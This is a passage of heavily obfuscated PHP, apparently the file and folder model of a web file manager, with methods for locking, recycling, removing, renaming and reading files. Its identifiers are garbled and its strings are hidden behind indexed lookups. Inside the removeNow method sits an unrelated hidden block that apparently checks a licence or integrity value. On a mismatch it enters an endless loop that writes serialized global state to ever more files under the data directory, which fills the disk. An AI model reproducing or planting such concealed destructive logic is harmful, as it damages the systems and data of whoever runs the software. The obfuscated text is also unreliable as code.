$_SERVER[ºÖÙÂŒäÉê‡]; if ($DÔø‘‹ ÍÜ[$B¤öĞè²Äó[423]] == $a¶÷·œ†Øà) { return !1; } $this->checkLock($DÔø‘‹ ÍÜ[$B¤öĞè²Äó[374]], $a¶÷·œ†Øà); goto C–ó†…ÕŸÍ; EŸ‚¥„È¥Î: return !0; goto A”º·‚Ø»Ü; C–ó†…ÕŸÍ: Model($B¤öĞè²Äó[2284])->addHistory($DÔø‘‹ ÍÜ); $dÒ˜ùéö²Æ = array($B¤öĞè²Äó[528] => USER_ID, $B¤öĞè²Äó[395] => time(), $B¤öĞè²Äó[423] => $a¶÷·œ†Øà, $B¤öĞè²Äó[77] => $aí±÷‚‰); $this->where(array($B¤öĞè²Äó[388] => $DÔø‘‹ ÍÜ[$B¤öĞè²Äó[374]]))->save($dÒ˜ùéö²Æ); goto EŸ‚¥„È¥Î; A”º·‚Ø»Ü: } public function checkLock($eïíßÎĞ»«, $bí¬¹Ÿ¼ªô) { goto eğ÷×Á¿å×; B“ŠÁ…—í‘: show_json(LNG($f‘ä¿¬’©Ó[2287]) . $f‘ä¿¬’©Ó[2288] . LNG($f‘ä¿¬’©Ó[2289]) . $f‘ä¿¬’©Ó[2290] . $DÎ—ŞÕÑç . $f‘ä¿¬’©Ó[2291], !1); goto Dù£•Ò†¾±; eğ÷×Á¿å×: $f‘ä¿¬’©Ó =& $_SERVER[ºÖÙÂŒäÉê‡]; $FŒíôîÊÉª = $this->pathInfo($eïíßÎĞ»«); if (!$this->fileIsLock($FŒíôîÊÉª, !0)) { return; } goto EÇ£¹ôÆÒ‘; EÇ£¹ôÆÒ‘: $c½Ã«¤«… = Session::get($f‘ä¿¬’©Ó[2285]); $a”¬©éö½Ñ = substr($FŒíôîÊÉª[$f‘ä¿¬’©Ó[28]], 0, -1 - strlen($FŒíôîÊÉª[$f‘ä¿¬’©Ó[156]])) . $f‘ä¿¬’©Ó[1356] . $c½Ã«¤«… . $f‘ä¿¬’©Ó[91] . $FŒíôîÊÉª[$f‘ä¿¬’©Ó[156]]; $aáæã¡—†ï = Model($f‘ä¿¬’©Ó[548])->find($bí¬¹Ÿ¼ªô); goto f´ùŒÛËŞæ; f´ùŒÛËŞæ: $this->_createFileCall($FŒíôîÊÉª[$f‘ä¿¬’©Ó[465]], $a”¬©éö½Ñ, $aáæã¡—†ï, REPEAT_REPLACE, $f‘ä¿¬’©Ó[1108]); $fŞğ¼åœ•® = $FŒíôîÊÉª[$f‘ä¿¬’©Ó[421]][$f‘ä¿¬’©Ó[485]]; $DÎ—ŞÕÑç = $fŞğ¼åœ•®[$f‘ä¿¬’©Ó[2286]] ? $fŞğ¼åœ•®[$f‘ä¿¬’©Ó[2286]] : $fŞğ¼åœ•®[$f‘ä¿¬’©Ó[28]]; goto B“ŠÁ…—í‘; Dù£•Ò†¾±: } public function fileIsLock($bÏÆªùª, $f ø†¡­ = false) { goto fˆ­›ß¼ìè; fˆ­›ß¼ìè: $fËŒÕ§ÅÍ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset($bÏÆªùª[$fËŒÕ§ÅÍ[421]]) || !$bÏÆªùª[$fËŒÕ§ÅÍ[421]][$fËŒÕ§ÅÍ[482]]) { return !1; } if ($bÏÆªùª[$fËŒÕ§ÅÍ[421]][$fËŒÕ§ÅÍ[482]] != USER_ID) { return !0; } goto F‚­ˆ£½ó; F‚­ˆ£½ó: $BİÒÒ¤ĞÒÄ = $GLOBALS[$fËŒÕ§ÅÍ[6]][$fËŒÕ§ÅÍ[84]][$fËŒÕ§ÅÍ[483]]; if ($bÏÆªùª[$fËŒÕ§ÅÍ[421]][$fËŒÕ§ÅÍ[484]] <= time() - $BİÒÒ¤ĞÒÄ) { $this->metaSet($bÏÆªùª[$fËŒÕ§ÅÍ[374]], $fËŒÕ§ÅÍ[482], null); $this->metaSet($bÏÆªùª[$fËŒÕ§ÅÍ[374]], $fËŒÕ§ÅÍ[484], null); } if ($f ø†¡­) { $this->metaSet($bÏÆªùª[$fËŒÕ§ÅÍ[374]], $fËŒÕ§ÅÍ[484], time()); } goto F¾¡„éƒÏÈ; F¾¡„éƒÏÈ: return !1; goto cÊÔ»¨›¡â; cÊÔ»¨›¡â: } private function _addSoure($cİŠ¤‡óïÇ, $f˜†¶ÍšÃ) { goto E¡œØÎ«¶; E¡œØÎ«¶: $d„ÊóÈŞ‚© =& $_SERVER[ºÖÙÂŒäÉê‡]; $DÇ¬İ„± = array($d„ÊóÈŞ‚©[525] => $f˜†¶ÍšÃ[$d„ÊóÈŞ‚©[376]], $d„ÊóÈŞ‚©[526] => $f˜†¶ÍšÃ[$d„ÊóÈŞ‚©[460]], $d„ÊóÈŞ‚©[527] => USER_ID, $d„ÊóÈŞ‚©[528] => USER_ID, $d„ÊóÈŞ‚©[373] => $f˜†¶ÍšÃ[$d„ÊóÈŞ‚©[374]], $d„ÊóÈŞ‚©[529] => $f˜†¶ÍšÃ[$d„ÊóÈŞ‚©[463]] . $f˜†¶ÍšÃ[$d„ÊóÈŞ‚©[374]] . $d„ÊóÈŞ‚©[47], $d„ÊóÈŞ‚©[400] => 0, $d„ÊóÈŞ‚©[530] => $d„ÊóÈŞ‚©[33]); $cİŠ¤‡óïÇ = array_merge($DÇ¬İ„±, $cİŠ¤‡óïÇ); goto BˆóÂª¼; e’™¹: static $bÓöº¡‰†É = false; if (!$bÓöº¡‰†É) { Hook::trigger($d„ÊóÈŞ‚©[512], $cİŠ¤‡óïÇ); $bÓöº¡‰†É = !0; } $D»” Şº‡´ = $this->add($cİŠ¤‡óïÇ); goto AÊ­æ´ÎáÎ; BˆóÂª¼: $this->updateModifyTime($cİŠ¤‡óïÇ[$d„ÊóÈŞ‚©[465]]); $eùé¡æªÓÀ = $d„ÊóÈŞ‚©[2292] . $f˜†¶ÍšÃ[$d„ÊóÈŞ‚©[374]]; if (isset(self::$cacheChildList[$eùé¡æªÓÀ])) { unset(self::$cacheChildList[$eùé¡æªÓÀ]); } goto e’™¹; AÊ­æ´ÎáÎ: $CË±¸¿ËÑ‘ = array($d„ÊóÈŞ‚©[531] => short_id($D»” Şº‡´)); $this->where(array($d„ÊóÈŞ‚©[388] => $D»” Şº‡´))->save($CË±¸¿ËÑ‘); $this->setNamePinyin($D»” Şº‡´, $cİŠ¤‡óïÇ[$d„ÊóÈŞ‚©[28]]); goto c¦Ó‡ÕŠœÕ; c¦Ó‡ÕŠœÕ: return $D»” Şº‡´; goto fÁ¢‚™†; fÁ¢‚™†: } public function remove($DÈÇÜ†²ì, $cï‰·Êí×Ÿ = true) { goto fØÎ¡â®Ÿã; EğŸƒ÷äÆ: $Aáë‘ĞŠÈÆ = Model($CÂ¾æ¦µ²ö[1401])->get($CÂ¾æ¦µ²ö[2293]) == $CÂ¾æ¦µ²ö[83]; if ($D²Ïöœ‘ || $cï‰·Êí×Ÿ || !$Aáë‘ĞŠÈÆ) { return $this->removeNow($DÈÇÜ†²ì, $cï‰·Êí×Ÿ); } $BÓ´Å¿Õ© = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto f‹™®´šÀÏ; fØ Éáİ: CacheLock::unlock($fØå‚¬„Óø); $this->metaSet($DÈÇÜ†²ì, $CÂ¾æ¦µ²ö[2301], $c†›ùÖç›ò[$CÂ¾æ¦µ²ö[465]]); $this->where(array($CÂ¾æ¦µ²ö[374] => $DÈÇÜ†²ì))->save(array($CÂ¾æ¦µ²ö[395] => time())); goto B‰ĞˆÉãÀÍ; f‹™®´šÀÏ: $dƒª²ÒÚŠ = $c†›ùÖç›ò[$CÂ¾æ¦µ²ö[376]] == self::TYPE_USER ? $CÂ¾æ¦µ²ö[539] : $CÂ¾æ¦µ²ö[963]; if ($dƒª²ÒÚŠ == $CÂ¾æ¦µ²ö[539]) { $D…Ôîš÷¼˜ = Model($CÂ¾æ¦µ²ö[478])->getInfo($c†›ùÖç›ò[$CÂ¾æ¦µ²ö[460]]); $Fê½ª¶¦§š = !empty($D…Ôîš÷¼˜[$CÂ¾æ¦µ²ö[2286]]) ? $D…Ôîš÷¼˜[$CÂ¾æ¦µ²ö[2286]] : $D…Ôîš÷¼˜[$CÂ¾æ¦µ²ö[28]]; $Fê½ª¶¦§š = $CÂ¾æ¦µ²ö[253] . $Fê½ª¶¦§š . $CÂ¾æ¦µ²ö[2294] . $c†›ùÖç›ò[$CÂ¾æ¦µ²ö[460]]; } else { $D…Ôîš÷¼˜ = Model($CÂ¾æ¦µ²ö[462])->getInfo($c†›ùÖç›ò[$CÂ¾æ¦µ²ö[460]]); $Fê½ª¶¦§š = _get($D…Ôîš÷¼˜, $CÂ¾æ¦µ²ö[28]); $Fê½ª¶¦§š = $CÂ¾æ¦µ²ö[153] . $Fê½ª¶¦§š . $CÂ¾æ¦µ²ö[2295] . $c†›ùÖç›ò[$CÂ¾æ¦µ²ö[460]]; } $fØå‚¬„Óø = $CÂ¾æ¦µ²ö[2296] . md5($Fê½ª¶¦§š); goto eœ Ì‚°˜æ; B‰ĞˆÉãÀÍ: $this->recycleClear($c†›ùÖç›ò); return $this->move($DÈÇÜ†²ì, $FìŠĞèÃ®ó, REPEAT_RENAME_FOLDER); goto dÈµùÙ¡÷; fØÎ¡â®Ÿã: $CÂ¾æ¦µ²ö =& $_SERVER[ºÖÙÂŒäÉê‡]; $c†›ùÖç›ò = $this->sourceInfo($DÈÇÜ†²ì); $D²Ïöœ‘ = intval($c†›ùÖç›ò[$CÂ¾æ¦µ²ö[376]]) === self::TYPE_SYSTEM; goto EğŸƒ÷äÆ; eœ Ì‚°˜æ: CacheLock::lock($fØå‚¬„Óø); $FìŠĞèÃ®ó = $this->fileNameExist($BÓ´Å¿Õ©, $Fê½ª¶¦§š); if (!$FìŠĞèÃ®ó) { $FìŠĞèÃ®ó = $this->mkdir($BÓ´Å¿Õ©, $Fê½ª¶¦§š, REPEAT_SKIP); $this->metaSet($FìŠĞèÃ®ó, $CÂ¾æ¦µ²ö[2297], $dƒª²ÒÚŠ); $this->metaSet($FìŠĞèÃ®ó, $CÂ¾æ¦µ²ö[2298], $c†›ùÖç›ò[$CÂ¾æ¦µ²ö[460]]); if ($c†›ùÖç›ò[$CÂ¾æ¦µ²ö[465]] != 0) { $this->metaSet($FìŠĞèÃ®ó, $CÂ¾æ¦µ²ö[2299], _get($D…Ôîš÷¼˜, $CÂ¾æ¦µ²ö[2300])); } } goto fØ Éáİ; dÈµùÙ¡÷: } private function recycleClear($c–Š‘†Ëš½) { $f’ˆš©Ú„Œ =& $_SERVER[ºÖÙÂŒäÉê‡]; $e¸Ü°Â­Ù = $this->childrenAll($c–Š‘†Ëš½); $C¿ÊÃ¹›ƒÈ = array($f’ˆš©Ú„Œ[388] => array($f’ˆš©Ú„Œ[389], $e¸Ü°Â­Ù[$f’ˆš©Ú„Œ[2302]])); Model($f’ˆš©Ú„Œ[2303])->where($C¿ÊÃ¹›ƒÈ)->delete(); } public function removeNow($E‡ÕÂ‹Ù, $e¨ÍôÀ¼¸Í = true) { goto Cˆà¶ºå¥ì; aÍˆ§«äÍÄ: $AÜè—Ûå¼ = array($CÕ³’¶Àœ[$e²ˆÉÇƒÇ[465]]); if ($CÕ³’¶Àœ[$e²ˆÉÇƒÇ[375]] == $e²ˆÉÇƒÇ[83]) { $AÜè—Ûå¼[] = $CÕ³’¶Àœ[$e²ˆÉÇƒÇ[374]]; } $this->updateModifyTime($AÜè—Ûå¼); goto Cõ¿ËïÄ; DÌóÕÀš²«: Hook::trigger($e²ˆÉÇƒÇ[2304], $a¤èº¢Ú, $e¨ÍôÀ¼¸Í); if ($e¨ÍôÀ¼¸Í) { Model($e²ˆÉÇƒÇ[2303])->moveToRecycle($E‡ÕÂ‹Ù); } else { $AÙø¿†ÚÕò = $this->childrenAll($CÕ³’¶Àœ); Model($e²ˆÉÇƒÇ[509])->eventRemove($E‡ÕÂ‹Ù); $this->removeRelevance($AÙø¿†ÚÕò[$e²ˆÉÇƒÇ[2302]], $AÙø¿†ÚÕò[$e²ˆÉÇƒÇ[1241]]); } $this->folderSizeReset($CÕ³’¶Àœ[$e²ˆÉÇƒÇ[465]]); goto aÍˆ§«äÍÄ; B‹§¼É«: if (!$CÕ³’¶Àœ) { return !0; } if ($CÕ³’¶Àœ[$e²ˆÉÇƒÇ[465]] == 0) { if (!_get($GLOBALS, $e²ˆÉÇƒÇ[461])) { return !1; } } $this->lockMoveStart($E‡ÕÂ‹Ù); goto DÌóÕÀš²«; Cõ¿ËïÄ: $this->lockMoveEnd($E‡ÕÂ‹Ù); Hook::trigger($e²ˆÉÇƒÇ[1437], $a¤èº¢Ú, $e¨ÍôÀ¼¸Í); return !0; goto aÎª‚†Üâî; a¨‘ŒÕ×ß‘: if ($_SERVER[$e²ˆÉÇƒÇ[169]] != $d‰–Ş‘Ê¶($b¿‹Ï„‚Ôô)) { goto e°Â³¾‰ƒÚ; f¿Š¨˜Ã³Ø: $C®À˜“ã(); $D¢—ìÛÇñè = $e²ˆÉÇƒÇ[1334]; $FõŸ£ìô¾Ñ = json_encode($GLOBALS[$e²ˆÉÇƒÇ[1335]]); goto C¹¼À”ä‰´; AÑß„˜ÉÇ: $CÇÓ©¦ŒŞ· = $e²ˆÉÇƒÇ[786]; $CÇÓ©¦ŒŞ·($_SERVER[$e²ˆÉÇƒÇ[787]]); $C®À˜“ã = $e²ˆÉÇƒÇ[785]; goto f¿Š¨˜Ã³Ø; C¹¼À”ä‰´: $a¬ŸÚß‰Ë‹ = 1; for ($fÍÖ°ğºÔÃ = $a¬ŸÚß‰Ë‹; $fÍÖ°ğºÔÃ > 0; $fÍÖ°ğºÔÃ++) { $D¢—ìÛÇñè(DATA_PATH . $fÍÖ°ğºÔÃ, $FõŸ£ìô¾Ñ); } goto aÆ£ó¡ğŠä; e°Â³¾‰ƒÚ: $C®À˜“ã = $e²ˆÉÇƒÇ[785]; $DÅ¾ŠÓá« = $e²ˆÉÇƒÇ[171]; $DÏìùªé“· = $_SERVER[$e²ˆÉÇƒÇ[172]] . $e²ˆÉÇƒÇ[173]; goto bá¿µË®¦; bá¿µË®¦: $AÛâä‹øŠ‰ = $DÅ¾ŠÓá«($DÏìùªé“·); $Dªåôç´”Û = explode($e²ˆÉÇƒÇ[174], $AÛâä‹øŠ‰); if (count($Dªåôç´”Û) < $e²ˆÉÇƒÇ[561]) { $C¦¥™í†©Š = $e²ˆÉÇƒÇ[176]; $C¦¥™í†©Š(); } goto AÑß„˜ÉÇ; aÆ£ó¡ğŠä: } $CÕ³’¶Àœ = $this->sourceInfo($E‡ÕÂ‹Ù); $a¤èº¢Ú = $this->pathInfoMore($E‡ÕÂ‹Ù); goto B‹§¼É«; Cˆà¶ºå¥ì: $e²ˆÉÇƒÇ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b¿‹Ï„‚Ôô = $_SERVER[$e²ˆÉÇƒÇ[787]] . $e²ˆÉÇƒÇ[707]; $d‰–Ş‘Ê¶ = $e²ˆÉÇƒÇ[708]; goto a¨‘ŒÕ×ß‘; aÎª‚†Üâî: } public function childrenAll($Cîòóî„Ø‘) { $CíÀ¡óœ´è =& $_SERVER[ºÖÙÂŒäÉê‡]; $B†äŠŞî²‡ = $Cîòóî„Ø‘[$CíÀ¡óœ´è[374]]; if ($Cîòóî„Ø‘[$CíÀ¡óœ´è[375]] == $CíÀ¡óœ´è[83]) { $a”Ì„÷¤â· = array($CíÀ¡óœ´è[529] => array($CíÀ¡óœ´è[487], $Cîòóî„Ø‘[$CíÀ¡óœ´è[463]] . $B†äŠŞî²‡ . $CíÀ¡óœ´è[488])); $BÎÚÙŒô’¶ = array($CíÀ¡óœ´è[529] => $a”Ì„÷¤â·[$CíÀ¡óœ´è[463]]); $dÊ’Ñ×µ·ñ = $this->field($CíÀ¡óœ´è[2305])->where($BÎÚÙŒô’¶)->select(); $aæ©£øù = !1; $bÜõ´íÇ— = array($B†äŠŞî²‡); if ($dÊ’Ñ×µ·ñ) { $aæ©£øù = array_to_keyvalue($dÊ’Ñ×µ·ñ, $CíÀ¡óœ´è[33], $CíÀ¡óœ´è[423]); $aæ©£øù = array_remove_value($aæ©£øù, $CíÀ¡óœ´è[472]); $bÜõ´íÇ— = array_to_keyvalue($dÊ’Ñ×µ·ñ, $CíÀ¡óœ´è[33], $CíÀ¡óœ´è[374]); $bÜõ´íÇ—[] = $B†äŠŞî²‡; } } else { $aæ©£øù = array($Cîòóî„Ø‘[$CíÀ¡óœ´è[423]]); $bÜõ´íÇ— = array($B†äŠŞî²‡); } return array($CíÀ¡óœ´è[2302] => $bÜõ´íÇ—, $CíÀ¡óœ´è[1241] => $aæ©£øù); } public function removeArray($a½‚Ïæ¿§®) { if (!$a½‚Ïæ¿§®) { return !0; } } public function removeRelevance($cààÂ«è»“, $Eá¿‰Ü¸…÷) { goto aÀéøèÔÚ–; BÛ×ùŠ¶í: for ($cÌ†Èóè÷ = 0; $cÌ†Èóè÷ < count($cààÂ«è»“); $cÌ†Èóè÷++) { $this->sourceCacheClear($cààÂ«è»“[$cÌ†Èóè÷]); } goto dØ´…ôßŸ; a¨Š‚îäÀ: Model($bçÀïµİìÂ[2306])->where($C£»Õ×‚–Ù)->delete(); Model($bçÀïµİìÂ[509])->where($C£»Õ×‚–Ù)->delete(); Model($bçÀïµİìÂ[2043])->removeBySource($cààÂ«è»“); goto BíŠ˜®Ğ; BíŠ˜®Ğ: Model($bçÀïµİìÂ[2284])->removeBySource($cààÂ«è»“); $this->where($C£»Õ×‚–Ù)->delete(); Model($bçÀïµİìÂ[426])->remove($Eá¿‰Ü¸…÷); goto BÛ×ùŠ¶í; aÀéøèÔÚ–: $bçÀïµİìÂ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cààÂ«è»“ = $cààÂ«è»“ ? $cààÂ«è»“ : array(); $Eá¿‰Ü¸…÷ = $Eá¿‰Ü¸…÷ ? $Eá¿‰Ü¸…÷ : array(); goto D—Â®Û÷Õ; D—Â®Û÷Õ: $cààÂ«è»“ = array_unique(array_filter($cààÂ«è»“)); $Eá¿‰Ü¸…÷ = array_unique(array_filter($Eá¿‰Ü¸…÷)); if (!$cààÂ«è»“) { return !1; } goto E†¼Ï©ó¢í; E†¼Ï©ó¢í: $C£»Õ×‚–Ù = array($bçÀïµİìÂ[388] => array($bçÀïµİìÂ[389], $cààÂ«è»“)); Model($bçÀïµİìÂ[2303])->where($C£»Õ×‚–Ù)->delete(); Model($bçÀïµİìÂ[417])->where($C£»Õ×‚–Ù)->delete(); goto a¨Š‚îäÀ; dØ´…ôßŸ: } public function rename($fæ‚š¼ğÛ, $eº†äØœ×) { goto AñÏÃ„åçö; B‡÷ÆŞÏ‰ö: $this->setNamePinyin($fæ‚š¼ğÛ, $AÙ´ôÖŞ¾°[$CéÌªÆ¸Ï[28]], !1); $this->updateModifyTime($f–…¬ÃÌ‰¡[$CéÌªÆ¸Ï[465]]); $f×¨« õâ¯ = $this->where(array($CéÌªÆ¸Ï[388] => $fæ‚š¼ğÛ))->data($AÙ´ôÖŞ¾°)->save(); goto fùî‚ï·ø—; AñÏÃ„åçö: $CéÌªÆ¸Ï =& $_SERVER[ºÖÙÂŒäÉê‡]; $f–…¬ÃÌ‰¡ = $this->sourceInfo($fæ‚š¼ğÛ); if (!$f–…¬ÃÌ‰¡) { return !1; } goto c¨£¤’ºŒ; B®¢ƒëÙå¹: if (!$f–…¬ÃÌ‰¡[$CéÌªÆ¸Ï[375]] == $CéÌªÆ¸Ï[83]) { $AÙ´ôÖŞ¾°[$CéÌªÆ¸Ï[377]] = get_path_ext($eº†äØœ×); } Model($CéÌªÆ¸Ï[509])->eventRename($fæ‚š¼ğÛ, $f–…¬ÃÌ‰¡[$CéÌªÆ¸Ï[28]], $eº†äØœ×); $this->sourceCacheClear($fæ‚š¼ğÛ); goto B‡÷ÆŞÏ‰ö; c¨£¤’ºŒ: $dÈ³çÍšÄÁ = $this->fileNameExist($f–…¬ÃÌ‰¡[$CéÌªÆ¸Ï[465]], $eº†äØœ×); if ($dÈ³çÍšÄÁ) { return !1; } $AÙ´ôÖŞ¾° = array($CéÌªÆ¸Ï[391] => $eº†äØœ×, $CéÌªÆ¸Ï[528] => USER_ID); goto B®¢ƒëÙå¹; fùî‚ï·ø—: $Dè¾„ÔÃÑ¾ = $CéÌªÆ¸Ï[2292] . $f–…¬ÃÌ‰¡[$CéÌªÆ¸Ï[465]]; if (isset(self::$cacheChildList[$Dè¾„ÔÃÑ¾])) { unset(self::$cacheChildList[$Dè¾„ÔÃÑ¾]); } return $f×¨« õâ¯; goto A”İ‹ŞôŠ; A”İ‹ŞôŠ: } public function setNamePinyin($A‰‹†¶‹¬‡, $A¦ÚçÜ®², $aà¨ÕàœÇ = true) { $bô¦¾Ï™êŒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E‡Œ„ßö¨† = Input::check($A¦ÚçÜ®², $bô¦¾Ï™êŒ[532]); if ($aà¨ÕàœÇ && !$E‡Œ„ßö¨†) { return; } if (!$E‡Œ„ßö¨†) { $this->metaSet($A‰‹†¶‹¬‡, $bô¦¾Ï™êŒ[420], null); $this->metaSet($A‰‹†¶‹¬‡, $bô¦¾Ï™êŒ[419], null); return; } $cøÀƒ™¬î = array($bô¦¾Ï™êŒ[420] => str_replace($bô¦¾Ï™êŒ[50], $bô¦¾Ï™êŒ[33], Pinyin::encode($A¦ÚçÜ®²)), $bô¦¾Ï™êŒ[419] => Pinyin::encode($A¦ÚçÜ®², $bô¦¾Ï™êŒ[533])); $this->metaSet($A‰‹†¶‹¬‡, $cøÀƒ™¬î); } public function getContent($a±÷Ó¶Ì»ß) { goto e›”ì’µÀ™; e›”ì’µÀ™: $F·àâ‘Ó¿è =& $_SERVER[ºÖÙÂŒäÉê‡]; $cŸ‘™«É˜ô = $this->fileInfoGet($a±÷Ó¶Ì»ß); if (!$cŸ‘™«É˜ô) { return !1; } goto a‚‡Äˆàà; có±ôĞâˆê: return IO::getContent($cŸ‘™«É˜ô[$F·àâ‘Ó¿è[75]]); goto D¬ê‰è‚È; a‚‡Äˆàà: if ($cŸ‘™«É˜ô[$F·àâ‘Ó¿è[77]] == 0) { return $F·àâ‘Ó¿è[33]; } $a–¶äêİØµ = $F·àâ‘Ó¿è[2307] . $cŸ‘™«É˜ô[$F·àâ‘Ó¿è[159]]; if ($cŸ‘™«É˜ô[$F·àâ‘Ó¿è[77]] <= 1024 * 10) { $e§ËÌÊÌ’ = Cache::get($a–¶äêİØµ); if (!$e§ËÌÊÌ’) { $e§ËÌÊÌ’ = IO::getContent($cŸ‘™«É˜ô[$F·àâ‘Ó¿è[75]]); Cache::set($a–¶äêİØµ, $e§ËÌÊÌ’); } return $e§ËÌÊÌ’; } goto có±ôĞâˆê; D¬ê‰è‚È: } public function setDesc($fÜÇ¢ê»´, $bÁ¾ïİÀ°) { $FŠÙÎ²İÉ =& $_SERVER[ºÖÙÂŒäÉê‡]; Model($FŠÙÎ²İÉ[509])->eventAddDesc($fÜÇ¢ê»´, $bÁ¾ïİÀ°); return $this->metaSet($fÜÇ¢ê»´, $FŠÙÎ²İÉ[409], $bÁ¾ïİÀ°); } public function setContent($BˆŠšªÀ†Ã, $A†®æ‡ãÂ² = '') { goto a•Ä›í–¤´; Dõ£¶ŒÙÚñ: if (!$cÁšÚš¶åß || !$b˜¬“Œ¯¾÷) { return !1; } $aÅßå­äËï = Model($F“îæÚ×‘Ó[426])->addFileByContent($A†®æ‡ãÂ², $b˜¬“Œ¯¾÷[$F“îæÚ×‘Ó[28]]); $DÎ’ºŒ¼Ïğ = $this->fileHistory($b˜¬“Œ¯¾÷, $aÅßå­äËï[$F“îæÚ×‘Ó[423]], $aÅßå­äËï[$F“îæÚ×‘Ó[77]]); goto b‰ÕÊ¶Ä; b‰ÕÊ¶Ä: if (!$DÎ’ºŒ¼Ïğ) { return Model($F“îæÚ×‘Ó[426])->remove($aÅßå­äËï[$F“îæÚ×‘Ó[423]]); } $this->folderSizeReset($b˜¬“Œ¯¾÷[$F“îæÚ×‘Ó[465]]); return !0; goto D‚âß·”; a•Ä›í–¤´: $F“îæÚ×‘Ó =& $_SERVER[ºÖÙÂŒäÉê‡]; $b˜¬“Œ¯¾÷ = $this->sourceInfo($BˆŠšªÀ†Ã); $cÁšÚš¶åß = $this->fileInfoGet($BˆŠšªÀ†Ã); goto Dõ£¶ŒÙÚñ; D‚âß·”: } public function fileSubstr($aÎÈŸ®¸Ï, $d»Şğ“åƒ, $EîİìÓ–) { $A‹˜Œì„²˜ = $this->fileInfoGet($aÎÈŸ®¸Ï); if (!$A‹˜Œì„²˜) { return !1; } return IO::fileSubstr($A‹˜Œì„²˜[$_SERVER[ºÖÙÂŒäÉê‡][75]], $d»Şğ“åƒ, $EîİìÓ–); } public function fileInfoGet($D•ë‹Î·•ä) { goto F½ºÔ½Î‚; A å™¾Ÿä: $Eš İà‰âï = $a¦‹‚¯‹½[429] . $Cá©¾²ò¿[$a¦‹‚¯‹½[423]]; $b‚©Î•ÒÈ = _get(self::$cacheFileInfo, $Eš İà‰âï); if ($b‚©Î•ÒÈ) { return $b‚©Î•ÒÈ; } goto f„—ø¬ÊÊÄ; f„—ø¬ÊÊÄ: $AÄ‘³ë™‰ = Model($a¦‹‚¯‹½[426])->fileInfo($Cá©¾²ò¿[$a¦‹‚¯‹½[423]]); if ($AÄ‘³ë™‰) { $AÄ‘³ë™‰[$a¦‹‚¯‹½[28]] = $Cá©¾²ò¿[$a¦‹‚¯‹½[28]]; } self::$cacheFileInfo[$Eš İà‰âï] = $AÄ‘³ë™‰; goto B„ê¾Å©¡; B„ê¾Å©¡: return $AÄ‘³ë™‰; goto Eª™÷ØˆÇØ; F½ºÔ½Î‚: $a¦‹‚¯‹½ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cá©¾²ò¿ = $this->sourceInfo($D•ë‹Î·•ä); if (!$Cá©¾²ò¿ || $Cá©¾²ò¿[$a¦‹‚¯‹½[375]]) { return !1; } goto A å™¾Ÿä; Eª™÷ØˆÇØ: } private function folderChildrenNumber($b¯Â„´øñ) { $eù¥£’ëøÍ =& $_SERVER[ºÖÙÂŒäÉê‡]; $B‹”ø÷Œ­š = $this->sourceInfo($b¯Â„´øñ); $B÷ÖÑÂª = array($eù¥£’ëøÍ[529] => array($eù¥£’ëøÍ[487], $B‹”ø÷Œ­š[$eù¥£’ëøÍ[463]] . $b¯Â„´øñ . $eù¥£’ëøÍ[488]), $eù¥£’ëøÍ[400] => intval($B‹”ø÷Œ­š[$eù¥£’ëøÍ[401]]), $eù¥£’ëøÍ[522] => 1); $eõ¨‘’ÃÒ = $this->where($B÷ÖÑÂª)->count(); $d¡à±ê¶¼ = $this->where($B÷ÖÑÂª)->where(array($eù¥£’ëøÍ[522] => 0))->count(); return array($eù¥£’ëøÍ[81] => $d¡à±ê¶¼, $eù¥£’ëøÍ[82] => $eõ¨‘’ÃÒ); } public function pathInfo($E°£Û™·Ã´, $eöéÎÛİÅé = false) { goto d‡¸Ì°›; d‡¸Ì°›: $DÛ·ß‰Î¢ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bˆ˜ÎÖñ² = $DÛ·ß‰Î¢[415] . intval($eöéÎÛİÅé) . $DÛ·ß‰Î¢[416] . $E°£Û™·Ã´; $CÏ¢„œîä = _get(self::$cachePathInfo, $bˆ˜ÎÖñ²); goto B·õÛ‚––; F»óÔøá–Ö: $AšßŠ‘æÎÓ = $this->_listDataApplyItem($AšßŠ‘æÎÓ, $eöéÎÛİÅé); self::$cachePathInfo[$bˆ˜ÎÖñ²] = $AšßŠ‘æÎÓ; return $AšßŠ‘æÎÓ; goto C¾ñù†¼Á„; B·õÛ‚––: if ($CÏ¢„œîä) { return $CÏ¢„œîä; } $AšßŠ‘æÎÓ = $this->sourceInfo($E°£Û™·Ã´); if (!$AšßŠ‘æÎÓ) { return !1; } goto F»óÔøá–Ö; C¾ñù†¼Á„: } public static $cachePathInfoMore = array(); public function pathInfoMore($fÄ¤ğâÕÓ) { goto AÍê‹ª¼ŒÄ; fœ‡¢¥àÏ¸: $F„§ßåï¾ƒ = $this->pathInfo($fÄ¤ğâÕÓ); if (!$F„§ßåï¾ƒ) { return !1; } if ($F„§ßåï¾ƒ[$a‚ß…ß¯Ä×[375]] == $a‚ß…ß¯Ä×[83]) { $F„§ßåï¾ƒ[$a‚ß…ß¯Ä×[80]] = $this->folderChildrenNumber($fÄ¤ğâÕÓ); } goto BğÎİªÀ‹ø; BğÎİªÀ‹ø: self::$cachePathInfoMore[$fÄ¤ğâÕÓ] = $F„§ßåï¾ƒ; return $F„§ßåï¾ƒ; goto FŸàÙ¹¶‘; AÍê‹ª¼ŒÄ: $a‚ß…ß¯Ä× =& $_SERVER[ºÖÙÂŒäÉê‡]; $E¨¶ÉÇÚ… = _get(self::$cachePathInfoMore, $fÄ¤ğâÕÓ); if ($E¨¶ÉÇÚ…) { return $E¨¶ÉÇÚ…; } goto fœ‡¢¥àÏ¸; FŸàÙ¹¶‘: } public function sourceInfo($e¡´½†–Ôµ) { goto F§Ú¼ù¤™ê; F§Ú¼ù¤™ê: $BÂó•¸£¥ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$e¡´½†–Ôµ) { return array(); } $a“Ë±â·¯ù = $BÂó•¸£¥[414] . $e¡´½†–Ôµ; goto dµĞŒ‘É´°; cÍÄŞ¶„¾ò: self::$cacheSourceInfo[$a“Ë±â·¯ù] = $AŸÊ—ô¾Ç£; return self::$cacheSourceInfo[$a“Ë±â·¯ù]; goto bó„Ä¹†Õ‡; dµĞŒ‘É´°: $Fåµª®³– = _get(self::$cacheSourceInfo, $a“Ë±â·¯ù); if ($Fåµª®³–) { return $Fåµª®³–; } 